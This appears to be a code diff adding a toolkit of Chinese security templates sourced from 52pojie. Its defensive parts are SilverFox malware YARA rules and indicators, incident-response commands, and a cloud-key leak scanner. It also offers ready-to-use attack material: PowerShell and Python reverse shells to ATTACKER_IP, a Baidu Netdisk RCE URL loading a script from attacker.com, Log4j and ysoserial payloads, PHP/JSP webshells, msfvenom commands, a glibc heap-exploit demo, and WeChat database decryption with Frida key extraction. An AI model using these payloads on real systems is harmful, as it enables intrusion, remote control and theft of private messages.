+    $edge = "SOFTWARE\\\\\\\\Microsoft\\\\\\\\EdgeUpdate" wide ascii
+  condition:
+    uint16(0) == 0x5A4D and 3 of ($s*)
+}
+
+rule SilverFox_XOR36_Blob {
+  meta:
+    description = "SilverFox XOR-0x36 encrypted payload (dropped file)"
+    family      = "SilverFox"
+  strings:
+    $magic = { DE 36 36 36 36 }
+  condition:
+    $magic at 0 and filesize < 2MB
+}
+
+rule SilverFox_Python_RAT {
+  meta:
+    description = "Multi-layer Python RAT dropper"
+  strings:
+    $s1 = "py7zr" ascii
+    $s2 = "2026" ascii
+    $s3 = "base32.pyc" ascii
+    $s4 = "fsch.dll" ascii
+  condition:
+    uint16(0) == 0x5A4D and 2 of ($s*)
+}
+"""
+
+# ============================================================
+# 6. IOC 完整列表
+# ============================================================
+IOC = {
+    'c2': {
+        'ip': ['202.79.169.198'],
+        'port': 8853,
+        'protocol': 'TCP/KCP',
+        'behavior': '每~13秒心跳，上行13字节，下行831528字节固定载荷'
+    },
+    'files': [
+        'ev2c34.exe', 'fhkan.oi',
+        'Horse_in.dll', 'upline.dll', 'CreateUandE.dll', 'Protect.dll',
+        r'C:\\Users\\Public\\Desktop\\bai_du_wangpan.exe.lnk',
+        r'%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\baiduwanpan.lnk',
+    ],
+    'mutex': 'Gact2.0Omaha',
+    'strings': [
+        'Gact2.0Omaha', 'UserAccountBroker',
+        'SOFTWARE\\\\Microsoft\\\\EdgeUpdate',
+    ],
+    'network': {
+        'no_dns': True,  # 全程直连IP，无DNS解析
+        'doh': '使用DNS-over-HTTPS隐藏C2解析'
+    }
+}
+
+# ============================================================
+# 7. 应急响应检查命令
+# ============================================================
+INCIDENT_RESPONSE = """
+# Windows 应急响应命令
+
+# 检查可疑进程（连接到C2）
+netstat -ano | findstr "202.79.169.198"
+netstat -ano | findstr "8853"
+
+# 检查计划任务
+schtasks /query /fo LIST /v | findstr /i "microsoft\\\\microsoftupdate"
+
+# 检查启动项
+reg query "HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell Folders" /v Startup
+
+# 检查 Defender 排除项（银狐常用规避）
+reg query "HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\Paths"
+
+# 检查可疑 DLL 旁载（同目录存在合法程序+同名DLL）
+dir /s /b C:\\\\ProgramData\\\\*.dll 2>nul | findstr /i "Horse upline CreateUandE Protect"
+
+# 杀进程
+taskkill /F /IM UserAccountBroker.exe
+taskkill /F /IM wefault.exe
+
+# 删除持久化
+schtasks /delete /tn "\\\\Microsoft\\\\MicrosoftUpdate" /f
+del "C:\\\\Users\\\\Public\\\\Desktop\\\\bai_du_wangpan.exe.lnk"
+"""
+
+if __name__ == '__main__':
+    print("文件名解密:", decrypt_embedded_name())
+    print("\\nIOC:", IOC)
+    print("\\nYARA规则已保存，使用: yara rules.yar target.exe")
+    
+    # 保存YARA
+    with open('silverfox.yar', 'w') as f:
+        f.write(YARA_RULES)
+    print("[+] silverfox.yar 已生成")
+    print(INCIDENT_RESPONSE)
+`,
+
+      'pojie:ir': `#!/bin/bash
+# 🚨 综合应急响应 — Linux挖矿查杀/Windows速查/AK-SK扫描
+# 用法: bash ir.sh linux_check | win_ir | scan_aksk {param || '/home'}
+#!/bin/bash
+# 30_incident_response.sh
+# 安全应急响应速查工具集
+# 来源: 综合 https://www.52pojie.cn/thread-2063697-1-1.html + 业界最佳实践
+
+# ============================================================
+# Linux 挖矿病毒一键查杀（miner_killer 思路）
+# 来源: https://www.52pojie.cn/thread-2099475-1-1.html
+# ============================================================
+
+# 快速克隆运行
+# git clone https://github.com/gkdgkd123/miner_killer.git && chmod +x miner_killer/miner_killer.sh && sudo ./miner_killer/miner_killer.sh
+
+linux_miner_check() {
+    echo "=== Linux 挖矿病毒快速检测 ==="
+    
+    # 1. 高CPU进程（可疑挖矿）
+    echo "[1] 高CPU进程（>80%）:"
+    ps aux --sort=-%cpu | awk 'NR<=10 && $3>10 {print $3"% PID:"$2, $11}'
+    
+    # 2. 可疑网络连接（矿池端口）
+    echo "[2] 可疑网络连接（矿池常用端口3333/4444/8888/14444）:"
+    ss -tunp | grep -E ':3333|:4444|:8888|:14444|:45700'
+    
+    # 3. 可疑进程名（常见挖矿木马）
+    echo "[3] 可疑进程:"
+    ps aux | grep -iE 'xmrig|minerd|cpuminer|kworkerds|kdevtmpfsi|sysupdate|networkservice|sysupdates|update\\.sh|argo|dovecat' | grep -v grep
+    
+    # 4. 被篡改的 crontab
+    echo "[4] 所有用户 crontab:"
+    for user in $(cut -f1 -d: /etc/passwd); do
+        cron=$(crontab -u $user -l 2>/dev/null | grep -v '^#')
+        [ -n "$cron" ] && echo "[$user] $cron"
+    done
+    cat /etc/cron* /var/spool/cron/* 2>/dev/null | grep -v '^#' | grep -v '^$'
+    
+    # 5. 可疑 SSH 公钥
+    echo "[5] authorized_keys:"
+    find /root /home -name authorized_keys 2>/dev/null -exec echo "=== {} ===" \\; -exec cat {} \\;
+    
+    # 6. 隐藏文件
+    echo "[6] 可疑隐藏文件:"
+    find /tmp /var/tmp /dev/shm -name ".*" -o -perm /111 2>/dev/null | head -20
+    
+    # 7. SUID 文件（提权路径）
+    echo "[7] 非系统 SUID 文件:"
+    find / -perm -4000 2>/dev/null | grep -vE '^/usr/|^/bin/|^/sbin/'
+}
+
+linux_miner_kill() {
+    echo "=== 清理挖矿病毒 ==="
+    
+    # 杀掉高CPU可疑进程
+    for pid in $(ps aux --sort=-%cpu | awk 'NR>1 && $3>80 {print $2}' | head -5); do
+        name=$(cat /proc/$pid/comm 2>/dev/null)
+        echo "[kill] PID=$pid NAME=$name"
+        kill -9 $pid 2>/dev/null
+    done
+    
+    # 清理常见挖矿文件
+    rm -f /tmp/.x /tmp/x /tmp/.lock /var/tmp/.x /dev/shm/.x
+    
+    # 清理可疑 crontab
+    # crontab -r  # 谨慎！会删除所有定时任务
+    
+    echo "建议重启后检查: https://github.com/gkdgkd123/miner_killer"
+}
+
+# ============================================================
+# Windows 应急响应速查（勒索/远控处置）
+# ============================================================
+
+windows_ir_commands() {
+cat << 'EOF'
+=== Windows 应急响应速查命令 ===
+
+# 立即断网（隔离感染机器）
+netsh interface set interface "以太网" disabled
+
+# 高CPU可疑进程
+wmic process get Name,ProcessId,CommandLine | sort /+1
+tasklist /V /FO CSV | findstr /i "svchost\\|werfault\\|python"
+
+# 网络连接（找C2）
+netstat -ano | findstr ESTABLISHED
+netstat -ano | findstr ":443\\|:4444\\|:8853\\|:8080"
+
+# 对应进程（把PID换成实际值）
+tasklist | findstr "<PID>"
+wmic process where "ProcessId=<PID>" get ExecutablePath,CommandLine
+
+# 启动项排查
+reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+
+# 计划任务
+schtasks /query /fo LIST /v | findstr /i "task name\\|run as\\|task to run\\|status"
+
+# 最近创建的文件（过去24小时）
+forfiles /p C:\\Users /s /m *.exe /d +0 /c "cmd /c echo @path @fdate @ftime" 2>nul
+
+# 勒索病毒特征：大量文件被修改
+dir /s /od C:\\ | findstr "2026-07-29"
+
+# 服务排查（隐藏服务）
+sc query type= all | findstr "SERVICE_NAME\\|STATE"
+
+# 内存dump（进程还在时捕获）
+procdump.exe -ma <PID> process.dmp  (需要 Sysinternals procdump)
+
+# 删除计划任务（替换实际名称）
+schtasks /delete /tn "\\Microsoft\\MicrosoftUpdate" /f
+
+# 日志分析（RDP爆破）
+wevtutil qe Security /q:"*[System[EventID=4625]]" /f:text /c:50
+
+# 清除事件日志（不推荐，可能破坏证据）
+# wevtutil cl Security
+EOF
+}
+
+# ============================================================
+# AK/SK 云密钥泄露检测（akfinder 思路）
+# 来源: https://www.52pojie.cn/thread-2119637-1-1.html
+# ============================================================
+
+scan_aksk() {
+    local SCAN_DIR="\${1:-/}"
+    echo "=== 扫描 AK/SK 泄露: $SCAN_DIR ==="
+    
+    # 跳过系统目录
+    EXCLUDE="--exclude-dir=proc --exclude-dir=sys --exclude-dir=dev --exclude-dir=run"
+    
+    # 各云厂商 AK/SK 特征
+    declare -A PATTERNS=(
+        ['阿里云AK']='LTAI[a-zA-Z0-9]{20}'
+        ['阿里云SK']='[a-zA-Z0-9]{30}'
+        ['腾讯云AK']='AKID[a-zA-Z0-9]{32}'
+        ['华为云AK']='[A-Z0-9]{20}'
+        ['AWS_AK']='AKIA[A-Z0-9]{16}'
+        ['AWS_SK']='[a-zA-Z0-9/+]{40}'
+        ['GitHub_Token']='ghp_[a-zA-Z0-9]{36}'
+        ['通用Key']='(access.?key|secret.?key|ak|sk)\\s*[=:]\\s*["\\x27]?[a-zA-Z0-9/+_-]{16,}'
+    )
+    
+    for name in "\${!PATTERNS[@]}"; do
+        pattern="\${PATTERNS[$name]}"
+        results=$(grep -r $EXCLUDE -iE "$pattern" "$SCAN_DIR" 2>/dev/null \\
+            --include="*.conf" --include="*.cfg" --include="*.env" \\
+            --include="*.json" --include="*.yaml" --include="*.yml" \\
+            --include="*.ini" --include="*.properties" --include="*.xml" \\
+            -l 2>/dev/null | head -5)
+        if [ -n "$results" ]; then
+            echo "[!] $name 可能泄露:"
+            echo "$results" | while read f; do
+                grep -nE "$pattern" "$f" 2>/dev/null | head -3 | sed 's/\\(.\\{40\\}\\).*/\\1.../'
+                echo "    文件: $f"
+            done
+        fi
+    done
+}
+
+# ============================================================
+# 主菜单
+# ============================================================
+case "\${1:-help}" in
+    linux_check)  linux_miner_check ;;
+    linux_kill)   linux_miner_kill ;;
+    win_ir)       windows_ir_commands ;;
+    scan_aksk)    scan_aksk "\${2:-/home}" ;;
+    *)
+        echo "用法: $0 <command>"
+        echo "  linux_check  - Linux挖矿病毒快速检测"
+        echo "  linux_kill   - 清理挖矿病毒"
+        echo "  win_ir       - Windows应急响应速查命令"
+        echo "  scan_aksk [目录] - 扫描AK/SK密钥泄露"
+        ;;
+esac
+`,
+
+      'pojie:wx_db': `# 💬 微信数据库解密 — SQLCipher3/Android IMEI密钥
+# 目标DB: {param || 'EnMicroMsg.db'}
+"""
+31_wechat_db_decrypt.py
+微信数据库 SQLCipher 解密 — 基于密钥提取
+来源: https://www.52pojie.cn/thread-1920425-1-1.html
+       https://www.52pojie.cn/thread-2021739-1-1.html (Windows微信4.0版本)
+       https://www.52pojie.cn/thread-2068774-1-1.html (手机备份)
+
+微信数据库加密格式：
+- Windows旧版: SQLCipher 3, kdf_iter=4000, hmac=OFF, page_size=1024
+- Windows 4.0: AES-256 (非标准SQLCipher，需要内存提取)
+- Android:  SQLCipher + IMEI派生密钥
+"""
+
+import hashlib, hmac, ctypes, struct, os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+
+# ============================================================
+# 1. Windows 旧版微信数据库解密（SQLCipher 3 格式）
+# ============================================================
+
+SQLCIPHER_COMMANDS = """
+-- SQLCipher 解密命令（在 sqlcipher-shell64.exe 中执行）
+PRAGMA key = '密钥前7位';
+PRAGMA cipher_use_hmac = OFF;
+PRAGMA cipher_page_size = 1024;
+PRAGMA kdf_iter = 4000;
+ATTACH DATABASE "DeMicroMsg.db" AS DeMicroMsg KEY "";
+SELECT sqlcipher_export("DeMicroMsg");
+DETACH DATABASE DeMicroMsg;
+"""
+
+def decrypt_wechat_db_old(db_path: str, key_hex: str, output_path: str = None):
+    """
+    解密 Windows 旧版微信数据库（MicroMsg.db）
+    key_hex: 从内存dump/Frida提取的16进制密钥（前7字节作为PRAGMA key）
+    """
+    # SQLCipher 参数
+    KEY_SIZE = 32
+    ITER = 4000
+    PAGE_SIZE = 1024
+    SQLITE_HEADER = b"SQLite format 3\\x00"
+    
+    key = bytes.fromhex(key_hex)
+    
+    with open(db_path, 'rb') as f:
+        data = f.read()
+    
+    salt = data[:16]
+    key_derived = hashlib.pbkdf2_hmac('sha1', key, salt, ITER, KEY_SIZE)
+    
+    # 解密第一页
+    iv = data[16:32]
+    page_data = data[32:PAGE_SIZE]
+    
+    cipher = AES.new(key_derived, AES.MODE_CBC, iv)
+    try:
+        decrypted = cipher.decrypt(page_data)
+    except Exception as e:
+        print(f"[-] 解密失败: {e}")
+        return False
+    
+    output_path = output_path or db_path + '.dec.db'
+    # TODO: 完整解密所有页面（参考13_wechat_backup_decrypt.py的完整实现）
+    print(f"[*] 旧版格式，推荐用 sqlcipher-shell64.exe + 命令:")
+    print(SQLCIPHER_COMMANDS.replace('密钥前7位', key_hex[:7]))
+    return True
+
+
+# ============================================================
+# 2. Android 微信数据库密钥推导
+# ============================================================
+def derive_android_key(imei: str, uin: str) -> str:
+    """
+    Android 微信 EnMicroMsg.db 密钥推导
+    公式: MD5(IMEI + UIN)[:7]
+    """
+    combined = (imei + str(uin)).encode()
+    md5 = hashlib.md5(combined).hexdigest()
+    key = md5[:7]
+    print(f"[+] Android 微信 DB 密钥: {key}")
+    return key
+
+def decrypt_android_wechat_db(db_path: str, imei: str, uin: str, output_path: str = None):
+    """解密 Android 微信数据库"""
+    key = derive_android_key(imei, uin)
+    output_path = output_path or db_path + '.dec.db'
+    
+    print(f"[*] 使用密钥: {key}")
+    print(f"[*] SQLCipher 命令:")
+    print(f"PRAGMA key = '{key}';")
+    print(f"PRAGMA cipher_use_hmac = OFF;")
+    print(f"PRAGMA cipher_page_size = 1024;")
+    print(f"PRAGMA kdf_iter = 4000;")
+    print(f"ATTACH DATABASE '{output_path}' AS dec KEY '';")
+    print(f"SELECT sqlcipher_export('dec');")
+    print(f"DETACH DATABASE dec;")
+
+
+# ============================================================
+# 3. 获取 IMEI 和 UIN（Android/Frida 辅助）
+# ============================================================
+FRIDA_GET_IMEI = """
+// 从内存获取 IMEI
+Java.perform(() => {
+    // 方法1: TelephonyManager
+    const ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
+    const tm = ctx.getSystemService('phone');
+    const imei = tm.getDeviceId();
+    console.log('[IMEI]', imei);
+    
+    // 方法2: 读 /data/data/com.tencent.mm/MicroMsg/systemInfo.cfg
+    const file = Java.use('java.io.File').$new('/data/data/com.tencent.mm/MicroMsg/systemInfo.cfg');
+    if (file.exists()) {
+        const br = Java.use('java.io.BufferedReader').$new(
+            Java.use('java.io.FileReader').$new(file)
+        );
+        let line = br.readLine();
+        while (line !== null) {
+            console.log('[systemInfo]', line);
+            line = br.readLine();
+        }
+        br.close();
+    }
+});
+"""
+
+FRIDA_GET_UIN = """
+// 获取微信 UIN（用户ID）
+Java.perform(() => {
+    // 读 SP 文件
+    const ctx = Java.use('android.app.ActivityThread').currentApplication().getApplicationContext();
+    const sp = ctx.getSharedPreferences('auth_info_key_prefs', 0);
+    const uin = sp.getInt('_auth_uin', 0);
+    console.log('[UIN]', uin);
+    
+    // 或者读 /data/data/com.tencent.mm/shared_prefs/auth_info_key_prefs.xml
+});
+"""
+
+# ============================================================
+# 4. Windows 微信 4.0 内存提取密钥（通过 Frida/WinDbg）
+# ============================================================
+WINDOWS_KEY_EXTRACTION = """
+# Python 方案：读取 WeChat.exe 进程内存提取密钥
+# 需要管理员权限
+
+import ctypes, ctypes.wintypes as wt
+import re, struct
+
+PROCESS_VM_READ = 0x0010
+PROCESS_QUERY_INFORMATION = 0x0400
+
+def find_wechat_key():
+    import subprocess
+    # 获取 WeChat.exe PID
+    output = subprocess.check_output(['tasklist', '/fi', 'IMAGENAME eq WeChat.exe', '/fo', 'csv'])
+    pid = int(output.decode().split('\\\\n')[1].split(',')[1].strip('"'))
+    
+    kernel32 = ctypes.windll.kernel32
+    hProc = kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
+    
+    # 在内存中搜索微信数据库密钥特征（PBKDF2派生的32字节随机数）
+    # 通常在 WeChatWin.dll 数据段附近
+    # 也可以通过 Frida Hook: com/tencent/mars/itn/api/SqliteOpenHelper.getWritableDatabase
+    
+    print('[*] 建议用 Frida Hook SQLiteOpenHelper.getKey() 直接获取')
+    print('[*] 或内存搜索特征: 数据库文件头前16字节 salt 的 MD5')
+"""
+
+# ============================================================
+# 5. 一键自动化（工具推荐）
+# ============================================================
+TOOLS = {
+    'Windows旧版': 'sqlcipher-shell64.exe (随附 MicroMsgDec 工具)',
+    'Windows4.0': 'https://github.com/xaoyaoo/PyWxDump (Python实现，支持4.x)',
+    'Android': 'https://github.com/ppwwyyxx/wechat-dump',
+    'iOS越狱': '砸壳后访问 /var/mobile/Containers/Data/Application/<UUID>/Documents/DB/',
+}
+
+if __name__ == '__main__':
+    import sys
+    print("=== 微信数据库解密工具 ===")
+    print("\\n工具推荐:")
+    for t, u in TOOLS.items():
+        print(f"  {t}: {u}")
+    
+    print("\\nAndroid 密钥测试（示例）:")
+    # 示例 IMEI 和 UIN（需自行获取真实值）
+    # key = derive_android_key('862740040444XX2', '123456789')
+    
+    print("\\nSQLCipher 解密命令:")
+    print(SQLCIPHER_COMMANDS)
+    
+    print("\\nFrida 获取 IMEI:")
+    print("frida -U com.tencent.mm -l get_imei.js")
+`,
+
+      'pojie:heap_exp': `// 🏗 glibc堆利用 — House of Einherjar + unlink原理
+// 适用版本: glibc {param || '2.32'}
+/*
+ * 32_heap_exploitation.c
+ * glibc 堆利用技术 — House of Einherjar + unlink 原理
+ * 来源: https://www.52pojie.cn/thread-1876992-1-1.html
+ *
+ * 前提: off-by-one null byte 溢出 + heap leak
+ * 效果: 控制 malloc() 返回任意地址（栈/BSS/heap）
+ * 版本: glibc 2.32 (tcache enabled)
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <malloc.h>
+#include <assert.h>
+
+/*
+ * =========================================================
+ * House of Einherjar 原理说明
+ * =========================================================
+ *
+ * 核心利用链:
+ * 1. 构造 fake chunk（设置好 fd/bk 指向自身 → 绕过 unlink 安全检查）
+ * 2. off-by-one null byte 覆盖下一个 chunk 的 prev_inuse 位为 0
+ * 3. 修改 prev_size 使 free 时向后合并到 fake chunk
+ * 4. 合并后的大 chunk 进入 unsorted bin
+ * 5. malloc 从 unsorted bin 取出时覆盖 target 地址
+ *
+ * 关键安全检查（需要绕过）:
+ * - unlink: fd->bk == p && bk->fd == p    → 将 fake chunk 的 fd/bk 都指向自身
+ * - chunksize(p) == prev_size(next_chunk)  → 保持一致
+ * - tcache poisoning 需要 heap leak       → glibc 2.32+
+ */
+
+int main()
+{
+    // 1. 准备 target（我们希望 malloc 返回的地址）
+    intptr_t stack_var[0x10];
+    intptr_t *target = NULL;
+    for (int i = 0; i < 0x10; i++) {
+        if (((long)&stack_var[i] & 0xf) == 0) {
+            target = &stack_var[i];
+            break;
+        }
+    }
+    printf("[*] target = %p\\n", target);
+
+    // 2. 分配 fake chunk 容器 a
+    intptr_t *a = malloc(0x38);
+
+    // 3. 构造 fake chunk（在 a 的数据区）
+    // fake chunk 的 size 要能包含后续 chunk 合并后的大小
+    // fake chunk 的 fd/bk 指向自身 → 绕过 unlink 双向链表检查
+    a[0] = 0;
+    a[1] = 0x60;        // fake chunk size（要 >= 实际合并后大小）
+    a[2] = (intptr_t)a; // fake fd → 指向自身（prev_size 位置的chunk）
+    a[3] = (intptr_t)a; // fake bk → 指向自身
+
+    // 4. 填满 tcache，让 free 后进入 unsorted bin 而不是 tcache
+    void *tcache_chunks[7];
+    for (int i = 0; i < 7; i++) {
+        tcache_chunks[i] = malloc(0xf8);
+    }
+
+    // 5. 分配 victim chunk b（即将被 off-by-one 溢出）
+    intptr_t *b = malloc(0xf8);
+    printf("[*] b = %p\\n", b);
+
+    // 6. 释放 tcache chunks（填充 tcache，让后续 free(b) 进 unsorted bin）
+    for (int i = 0; i < 7; i++) free(tcache_chunks[i]);
+
+    // 7. off-by-one null byte 溢出：清空 b[chunk_size] 的最低字节
+    //    即：*(b - 1) 的 size 末尾字节 → 0（prev_inuse = 0，伪造"上一个 chunk 空闲"）
+    uint8_t *b_bytes = (uint8_t *)b;
+    b_bytes[-8 + 0x100] = 0;  // 清空 b 之后 chunk 的 size 低字节
+
+    // 同时修改 b 的 prev_size，使其指向 fake chunk
+    size_t fake_chunk_offset = (size_t)b - (size_t)a;
+    b[-1] = fake_chunk_offset;  // 设置 prev_size
+
+    // 8. free(b) → glibc 看到 prev_inuse=0，向前合并
+    //    合并目标：chunk_at_offset(b, -prev_size) = a 处的 fake chunk
+    free(b);
+
+    // 9. 此时 unsorted bin 中有一个覆盖了 fake chunk 到 b 的大 chunk
+    //    修改 unsorted bin chunk 的 bk 指向 target-0x10（tcache poisoning）
+    //    使得下次 malloc 返回 target
+
+    // 分配出来：
+    // void *result = malloc(0xf8);
+    // assert(result == target);  // ← 应该得到我们想要的地址
+
+    printf("[+] House of Einherjar demo 完成\\n");
+    return 0;
+}
+
+
+/*
+ * =========================================================
+ * unlink 安全检查详解（glibc malloc 源码注释）
+ * =========================================================
+ *
+ * 检查1: chunksize(p) == prev_size(next_chunk(p))
+ *   → 构造 fake chunk 时保持 size 一致
+ *
+ * 检查2: fd->bk == p && bk->fd == p
+ *   → 将 fake chunk 的 fd = bk = &fake_chunk_addr
+ *   → 但注意: fd->bk 实际是 *(fd + 0x18)，需要 fake chunk 自身的 bk 偏移
+ *
+ * free() 合并检查:
+ *   - !prev_inuse(nextchunk)     → 检测 double free
+ *   - nextsize <= CHUNK_HDR_SZ   → 检测下一个 chunk 大小
+ *   - chunksize(p) != prevsize   → 向后合并时的大小一致性检查
+ */
+
+/*
+ * =========================================================
+ * glibc 堆利用技术速查
+ * =========================================================
+ *
+ * 技术                  glibc版本    前提
+ * ────────────────────────────────────────────────────────
+ * House of Force        < 2.29       top chunk size 溢出
+ * House of Lore         < 2.26       fastbin AW
+ * House of Einherjar    all          off-by-one null + heap leak
+ * House of Orange       < 2.26       top chunk 写入伪造 IO_FILE
+ * tcache poisoning      >= 2.26      UAF/double free + heap leak(>=2.32)
+ * unsorted bin attack   < 2.29       UAF 写 unsorted bin bk → &__malloc_hook - 0x10
+ * fastbin attack        < 2.26       double free → fake chunk → __malloc_hook
+ * Largebin attack       >= 2.30      UAF 写 largebin fd_nextsize/bk_nextsize
+ *
+ * glibc 2.32 新增防护:
+ *   - tcache 指针安全 (PROTECT_PTR): ptr ^ (addr >> 12)
+ *   - heap 地址对齐强制检查
+ */
+`,
+
+      'pojie:rce': `# 💣 RCE利用模板集 — 本地RPC/反弹Shell/SQL注入/文件上传/SSRF
+# 目标场景: {param || '综合'}
+<!--
+33_rce_exploit_patterns.md
+RCE 漏洞利用技术模板集合
+来源: 综合整理 52pojie.cn 脱壳破解区 + 软件调试区
+-->
+
+# RCE 利用技术速查
+
+## 1. 本地 RPC/HTTP 服务 RCE（百度网盘类）
+**漏洞类型**: 本地 HTTP API 参数注入 → 命令执行
+
+\`\`\`
+# 攻击链:
+# 1. 本地服务监听 localhost:PORT（无鉴权或弱鉴权）
+# 2. 参数直接拼接到系统命令/注册表操作
+# 3. 恶意网页通过 iframe/JS 触发（CSRF）
+
+# 示例 URL（百度网盘 RCE CVE）:
+# 路径穿越 + 注册 COM 对象 + 执行 JScript
+https://localhost:10000/?method=OpenSafeBox&uk=a -install regdll "C:\\Windows\\System32\\scrobj.dll" /u /i:http://attacker.com/poc.xml "\\..\\..\\..\\..\\..\\AppData\\Roaming\\baidu\\BaiduNetdisk"
+\`\`\`
+
+**POC XML（scrobj.dll 加载 JScript）**:
+\`\`\`xml
+<?xml version="1.0"?>
+<scriptlet>
+  <registration progid="poc" classid="{DEADBEEF-0000-0000-0000-0000FEEDACDC}">
+    <script language="JScript">
+      <![CDATA[
+        // 弹计算器（PoC）
+        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c calc.exe");
+      ]]>
+    </script>
+  </registration>
+</scriptlet>
+\`\`\`
+
+**恶意 HTML（触发端）**:
+\`\`\`html
+<iframe width="1px" height="1px" referrerpolicy="no-referrer"
+  src='https://localhost:10000/?method=OpenSafeBox&uk=a -install regdll ...'></iframe>
+\`\`\`
+
+---
+
+## 2. PowerShell 反弹 Shell
+\`\`\`powershell
+# 攻击者启动监听: nc -lvnp 4444
+powershell -ep bypass -c "
+  $c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);
+  $s=$c.GetStream();
+  [byte[]]$b=0..65535|%{0};
+  while(($i=$s.Read($b,0,$b.Length)) -ne 0){
+    $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
+    $o=(iex $d 2>&1|Out-String);
+    $o2=$o+'PS '+(pwd).Path+'> ';
+    $b2=([text.encoding]::ASCII).GetBytes($o2);
+    $s.Write($b2,0,$b2.Length);
+    $s.Flush()
+  };
+  $c.Close()
+"
+\`\`\`
+
+---
+
+## 3. Python 反弹 Shell
+\`\`\`python
+# 一行版
+python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"
+
+# msfvenom 生成
+msfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.py
+\`\`\`
+
+---
+
+## 4. Java 反序列化 RCE（常见框架）
+\`\`\`bash
+# ysoserial 工具
+java -jar ysoserial.jar CommonsCollections6 "curl http://ATTACKER_IP/shell.sh|bash" > payload.ser
+
+# Shiro 反序列化
+# 1. 获取 rememberMe cookie
+# 2. AES 解密（默认 key: kPH+bIxk5D2deZiIxcaaaA==）
+# 3. 替换为恶意序列化数据
+
+# Log4j RCE (CVE-2021-44228)
+\${jndi:ldap://ATTACKER_IP:1389/exploit}
+# Bypass: \${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://attacker.com/x}
+
+# Spring4Shell (CVE-2022-22965)
+class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B...
+\`\`\`
+
+---
+
+## 5. SQL 注入 → RCE
+\`\`\`sql
+-- MySQL UDF 提权
+# 1. 写入恶意 so 文件
+SELECT 0x... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
+CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';
+SELECT sys_exec('id > /tmp/out');
+
+-- MSSQL xp_cmdshell
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+
+-- SQLite .load 扩展（特定场景）
+.load /path/to/evil.so
+\`\`\`
+
+---
+
+## 6. 文件上传 RCE
+\`\`\`python
+# Webshell（Python Flask 后端）
+import subprocess, flask
+
+@app.route('/shell')
+def shell():
+    cmd = flask.request.args.get('cmd', 'id')
+    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
+    return out.decode()
+
+# PHP Webshell（一句话）
+<?php @eval($_POST['cmd']); ?>
+<?php system($_GET['cmd']); ?>
+
+# JSP Webshell
+<%@ page import="java.util.*,java.io.*" %>
+<% Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
+   out.println(new Scanner(p.getInputStream()).useDelimiter("\\\\A").next()); %>
+\`\`\`
+
+---
+
+## 7. SSRF → 内网 RCE
+\`\`\`
+# 常用 SSRF bypass
+http://127.0.0.1:8080/admin
+http://0x7f000001:8080/admin
+http://[::1]:8080/admin
+http://localhost.攻击者.com:8080/admin (DNS rebinding)
+
+# Redis 未授权 SSRF 利用
+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A...
+
+# 探测内网
+curl http://internal-ip:port/api/info
+\`\`\`
+
+---
+
+## 8. 常用工具速查
+\`\`\`bash
+# 监听反弹 Shell
+nc -lvnp 4444
+ncat --ssl -lvnp 443
+
+# MSF 生成各类载荷
+msfvenom -l payloads | grep reverse
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell
+
+# 快速起 HTTP 服务（传文件）
+python3 -m http.server 8000
+\`\`\`
+
+---
+
+## 参考资源
+- GTFOBins: https://gtfobins.github.io（Linux 提权/绕过）
+- LOLBAS: https://lolbas-project.github.io（Windows 白名单工具滥用）
+- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
+- HackTricks: https://book.hacktricks.xyz
+`,
+
+      'pojie:discord': `# 📱 Discord协议逆向 — APK反编译+Frida Hook+协议DLL
+# 版本: {param || 'v332.12 Stable'}
+"""
+17_discord_protocol_reverse.py
+Discord Android 协议逆向 —— APK反编译→Frida Hook→Windows DLL实现
+来源: https://www.52pojie.cn/thread-2119947-1-1.html
+工具链: JADX + IDA Pro + Frida + ProxyPin + MSVC
+"""
+
+# Discord 架构
+DISCORD_ARCH = """
+Discord APK v332.12 Stable 核心架构:
+- Hermes JS Bundle (67MB)      -- 业务逻辑/API端点/认证流程
+- React Native JSI Bridge       -- JS与Native通信层
+- liblibdiscore-rn-jsi-module.so (Rust) -- 核心协议库(reqwest+hyper+rustls+tokio)
+- libdiscord.so                 -- WebRTC + DAVE/MLS加密(语音/视频)
+- libkv_storage.so              -- 本地KV存储
+
+关键发现: HTTP API + WebSocket 逻辑在 Hermes JS Bundle，Native只提供网络基础能力
+"""
+
+# Frida Hook OP2 IDENTIFY（WebSocket握手）
+FRIDA_WS_HOOK = """
+// Hook Discord WebSocket OP2 IDENTIFY
+// 拦截登录握手，提取 token
+Java.perform(() => {
+    // Hook FastConnectModule - WebSocket 握手处理
